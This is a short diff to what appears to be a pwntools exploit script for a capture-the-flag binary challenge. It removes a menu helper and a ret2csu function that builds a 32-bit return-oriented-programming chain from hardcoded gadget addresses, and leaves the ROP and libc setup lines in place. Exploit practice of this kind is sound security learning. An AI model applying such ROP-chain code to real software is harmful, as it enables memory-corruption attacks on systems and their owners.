@@ -44,37 +44,6 @@ def change_name(name):
     sla("Enter your name: ", name)
     option(1)
 
-def change_IP(IP):
-    option(6)
-    option(3)
-    sa("Enter your IP address: ", IP)
-    option(1)
-
-def ret2csu(call_what=0xb16b00b, esi=0x0, edi=0x0, edx=0x1337, return_to=exe.sym.main, return_ebx=0x0, return_esi=0x0, return_edi=0x0, return_ebp=0x0):
-    tmp = flat([
-        gadget("ret;"),
-        call_what+0x104, #call what ebx - 0x104
-        0x1, #esi
-        0x0, #edi
-        edi, #ebp mov    dword ptr [esp], ebp
-        0x0804A6B8, #csu 
-        edi,        #edi
-        esi,  #esi
-        edx, #edx
-        cyclic(16),
-        return_ebx,
-        return_esi,
-        return_edi,
-        return_ebp,
-        return_to, # return back
-        gadget("ret;"),
-        esi, #mov    dword ptr [esp + 4], eax
-        edx, #mov    dword ptr [esp + 8], eax
-        # gadget("ret;")*8,
-    ])
-    return tmp
-
-
 r = ROP(exe)
 libc = ELF(exe.libc.path)
 io = start()
